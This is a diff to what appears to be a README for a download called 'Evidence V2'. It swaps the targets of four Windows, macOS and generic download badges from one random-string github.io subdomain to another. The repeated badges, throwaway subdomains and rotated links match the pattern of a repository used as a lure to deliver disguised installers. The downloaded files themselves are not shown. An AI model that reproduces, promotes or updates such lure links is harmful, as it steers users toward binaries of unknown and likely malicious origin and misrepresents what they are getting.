@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download_Evidence%20V2-F9A825?style=for-the-badge&logo=github)](https://bvgutwastvpd.github.io/windows-pkg/)
+[![Download](https://img.shields.io/badge/Download_Evidence%20V2-F9A825?style=for-the-badge&logo=github)](https://zqhzqrfmocza.github.io/win-release/)
 
 </div>
 
@@ -55,9 +55,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://bvgutwastvpd.github.io/windows-pkg/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zqhzqrfmocza.github.io/win-release/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://bvgutwastvpd.github.io/macos-pkg/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zqhzqrfmocza.github.io/mac-release/)
 
 </div>
 
@@ -74,7 +74,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download_Evidence%20V2-F9A825?style=for-the-badge&logo=github)](https://bvgutwastvpd.github.io/windows-pkg/)
+[![Download](https://img.shields.io/badge/Download_Evidence%20V2-F9A825?style=for-the-badge&logo=github)](https://zqhzqrfmocza.github.io/win-release/)
 
 </div>
 
